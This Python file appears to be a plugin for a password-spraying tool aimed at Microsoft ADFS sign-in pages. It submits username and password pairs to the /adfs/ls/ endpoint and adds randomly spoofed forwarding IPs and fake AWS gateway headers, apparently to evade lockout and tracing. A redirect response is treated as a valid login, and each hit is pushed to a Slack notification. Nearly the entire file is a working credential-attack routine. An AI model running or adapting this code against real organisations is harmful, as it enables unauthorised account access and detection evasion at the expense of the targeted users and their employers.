import datetime, requests
import utils.utils as utils


def adfs_authenticate(url, username, password, useragent, pluginargs):

    ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')

    data_response = {
        'timestamp': ts,
        'username': username,
        'password': password,
        'success': False,
        'change': False,
        '2fa_enabled': False,
        'type': None,
        'code': None,
        'name': None,
        'action': None,
        'headers': [],
        'cookies': [],
        'sourceip': None,
        'throttled': False,
        'error': False,
        'output': ""
    }

    # post_data = urllib.parse.urlencode({'UserName': username, 'Password': password,
    #                                    'AuthMethod': 'FormsAuthentication'}).encode('ascii')
    post_data = {
        'UserName': username,
        'Password': password,
        'AuthMethod': 'FormsAuthentication'
    }

    # ?client-request-id=&wa=wsignin1.0&wtrealm=urn:federation:MicrosoftOnline&wctx=cbcxt=&username={}&mkt=&lc=
    params_data =  {
        'client-request-id' : '',
        'wa' : 'wsignin1.0',
        'wtrealm' : 'urn:federation:MicrosoftOnline',
        'wctx' : '',
        'cbcxt' : '',
        'username' : username,
        'mkt' : '',
        'lc' : '',
        'pullStatus' : 0
    }

    spoofed_ip = utils.generate_ip()  # maybe use client related IP address
    amazon_id = utils.generate_id()
    trace_id = utils.generate_trace_id()

    headers = {
        'User-Agent': useragent,
        "X-My-X-Forwarded-For": spoofed_ip,
        "x-amzn-apigateway-api-id": amazon_id,
        "X-My-X-Amzn-Trace-Id": trace_id,

        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9, image/webp,*/*;q=0.8'
    }

    headers = utils.add_custom_headers(pluginargs, headers)

    try:

        resp = requests.post("{}/adfs/ls/".format(url), headers=headers, params=params_data, data=post_data, allow_redirects=False)
        data_response['code'] = resp.status_code

        if resp.status_code == 302:
            utils.slacknotify(username, password)
            data_response['success'] = True
            data_response['output'] = utils.prGreen('SUCCESS_MESSAGE: => {}:{}'.format(
                username, password))

        else:  # fail
            data_response['success'] = False
            data_response['output'] = utils.prRed('FAILURE_MESSAGE: {} => {}:{}'.format(
                resp.status_code, username, password))

    except Exception as ex:
        data_response['error'] = True
        data_response['output'] = ex
        pass

    return data_response
